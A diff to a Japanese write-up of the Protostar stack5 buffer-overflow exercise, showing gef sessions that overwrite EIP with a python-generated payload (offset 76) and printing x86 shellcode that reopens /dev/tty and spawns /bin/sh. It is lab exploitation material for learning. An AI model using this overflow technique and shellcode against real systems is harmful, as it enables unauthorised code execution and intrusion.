@@ -127,8 +127,8 @@ Entry point           : 0x08048310
 オフセットが **76** なので、
 
 ```shell
-gef➤  r <<< $(python -c 'print "A"*76 + "\xef\xbe\xed\x1c" + "B"*128')
-Starting program: /home/mkm/Develop/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xed\x1c" + "B"*128')
+gef➤  r <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
+Starting program: /home/mkm/Develop/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
 
 Breakpoint 1, main (argc=0x42424242, argv=0x42424242) at stack5/stack5.c:11
 ⋮
@@ -156,7 +156,6 @@ gef➤  telescope $esp l30
 0xffffd2c0│+0x50: 0x41414141
 0xffffd2c4│+0x54: 0x41414141
 0xffffd2c8│+0x58: 0x41414141	 ← $ebp
-0xffffd2cc│+0x5c: 0x1cedbeef
 0xffffd2d0│+0x60: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
 0xffffd2d4│+0x64: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
 0xffffd2d8│+0x68: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
@@ -167,9 +166,9 @@ gef➤  c
 Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
-0x1cedbeef in ?? ()
+0xdeadbeef in ?? ()
 ⋮
-$eip   : 0x1cedbeef
+$eip   : 0xdeadbeef
 ⋮
 ```
 
@@ -178,7 +177,7 @@ $eip   : 0x1cedbeef
 ## どこに書き換えるか？
 
 `$eip`を自由に書き換えられるということは、次に飛ばすアドレスを好きにできることである
-この`$eip`を書き換えたスタックのアドレスの直後にshellcodeを仕込んで見る
+そこで、`$eip`をスタックポインタのアドレスの直後に書き換えて、そこ(`$esp+4`)にshellcodeを仕込んで見る
 
 ただし、`gets`を用いた際に新たにshellを開こうとすると、すぐにターミナルが閉じてしまいコマンドを入力できない
 そこで、`/dev/tty`を再度開いたのちに、`/bin/sh`を起動させる
@@ -188,3 +187,8 @@ shellcodeは[exploit DB](https://www.exploit-db.com/exploits/13357/)のものを
 shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 ```
 
+まずこのようにして実行してコアダンプを取得
+
+```shell
+% ./stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
+```
